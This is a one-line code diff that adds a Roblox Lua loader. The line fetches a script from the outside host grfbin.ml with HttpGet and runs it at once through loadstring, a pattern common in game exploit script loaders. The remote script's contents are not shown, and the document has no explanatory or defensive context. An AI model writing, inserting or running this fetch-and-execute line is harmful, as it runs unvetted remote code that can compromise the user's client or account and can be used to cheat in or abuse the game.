@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://grfbin.ml/scripts/proxo.lua'))()
